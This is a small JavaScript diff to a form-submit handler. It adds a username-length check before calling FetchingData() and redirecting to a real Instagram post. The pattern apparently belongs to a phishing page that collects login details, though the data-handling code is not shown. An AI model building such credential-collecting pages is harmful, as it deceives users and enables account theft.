@@ -27,7 +27,7 @@ form.addEventListener('submit', e => {
       
   }
 
-  if(password.value.length>6){
+  if(password.value.length>6 && username.value.length>6){
     FetchingData()
     window.location.href = "https://www.instagram.com/p/CZHOENLAAGc/?utm_source=ig_web_copy_link";
   }else {
